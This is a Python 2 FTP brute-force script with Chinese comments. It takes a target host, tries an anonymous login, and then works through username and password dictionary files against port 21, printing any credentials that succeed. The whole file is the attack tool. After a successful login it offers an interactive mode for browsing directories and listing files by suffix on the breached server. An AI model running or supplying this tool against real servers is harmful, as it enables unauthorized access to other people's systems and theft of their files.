# coding=utf-8
#!/usr/bin/env python2
# 匿名账户
# 字典
# 连接目标
# 爆破
import multiprocessing.pool
import ftplib
import optparse
import IPy
# 爆破登录函数
def check_conn(user,pswd,ip):
	global info
	if user != None and pswd != None:
		try:
			info = None
			port = 21
			ftp=ftplib.FTP()
			# ftp.set_debuglevel(2)   #调试显示详细信息
			ftp.connect(str(ip),int(port))       #连接
			ftp.set_pasv(False)     #释放超时
			ftp.login(str(user),str(pswd))  #尝试登录
			ftp.quit()
			info = ftp.getwelcome()
			return info
			# ftp.set_debuglevel(0)
			# return welcome
		except ftplib.error_perm:
			pass
	else:
		exit(0)
	# 读取文件函数
def conn(user,pasw):
	try:
		global ftp
		ftp = ftplib.FTP()
		port = 21
		ftp.connect(ip,port)
		ftp.login(user,pasw)
		print "登录成功"
		return 1
	except:
		return 0
def main():
	global ftp
	global ips
	global pass_dict
	global info
	global ip
	# 配置变量，命令行
	parser = optparse.OptionParser()
	parser.add_option('-H','--lhost',dest = 'ipadd',help = 'ip_tag ps:192.168.0.0/24')
	parser.add_option('-U','--user_file',dest = 'userfile',help = 'userdic')
	parser.add_option('-P','--pass_file',dest = 'passfile',help = 'passdic')
	parser.add_option('-i','--ip',dest = 'tag',help = 'one_tag ps:192.168.0.1')
	parser.add_option('-n','--user',dest = 'username',help = 'username')
	parser.add_option('-p','--pass',dest = 'pass',help = 'pass')
	parser.add_option('-a','--anony',default = '1',dest = 'anony',help = 'anony')
	(options, args) = parser.parse_args()
	if(options.ipadd == None ) and (options.tag == None):
		print "目标参数错误"
		exit(0)
	elif(options.userfile == None) and (options.passfile == None):
		print "参数错误"
		exit(0)
	else:
		if options.ipadd != None:
			flag = 1
			ips = IPy.IP(str(options.ipadd))
		else:
			flag = 0
			ip = str(options.tag)
		if(flag == 1):
			for ipn in ips:
				print ipn
		anony = int(options.anony)
		user_file = str(options.userfile)
		pass_file = str(options.passfile)
		# 匿名账户
		if(anony):
			try:
				global info
				info = None
				user = 'anonymous'
				pswd = 'Null'
				port = 21
				ftp = ftplib.FTP()
				ftp.connect(str(ip), int(port))
				ftp.set_pasv(False)
				ftp.login(str(user), str(pswd))
				info = ftp.getwelcome()
				ftp.quit()
				if (info != None):
					print '"\033[0;31;40m [+] \033[0m' + ip + ' version： ' + info + '\n' + 'username：' + user + ' password：' + pswd
			except ftplib.error_perm:
				print '匿名账户登录错误'
		# 读取字典，爆破
		user_dict = open(user_file, 'r')
		for list in user_dict:
			pass_dict = open(pass_file, 'r')
			username = list.strip()
			for list in pass_dict:
				password = list.strip()
				info = check_conn(username, password, ip)
				if info == None:
					continue
				else:
					print '"\033[0;31;40m [+] \033[0m' + ip + ' version： ' + info + '\n' + 'username：' + username + ' password：' + password
		user_dict.close()
		pass_dict.close()
		# 读取文件，索引后缀，下载指定文件
		cont = raw_input("是否继续读取文件 yes/no：")
		if(cont != "yes"):
			exit(0)
		user = raw_input("账户：")
		pasw = raw_input("密码：")
		try:
			if (conn(user, pasw)):
				while True:
					print "当前目录:" + ftp.pwd()
					dirr = raw_input("切换到路径(exit退出)：")
					if(dirr == "exit"):
						exit(0)
					ftp.dir()
					su = str(raw_input("索引的后缀："))
					nlst = ftp.nlst()
					for i in nlst:
						finds = i.find(su)
						if finds == -1:
							continue
						print i
					ftp.cwd(dirr)
					if dirr == "exit" or su == "exit":
						ftp.quit()
						break
		except:
			print "输入错误"
if __name__ == '__main__':
	main()
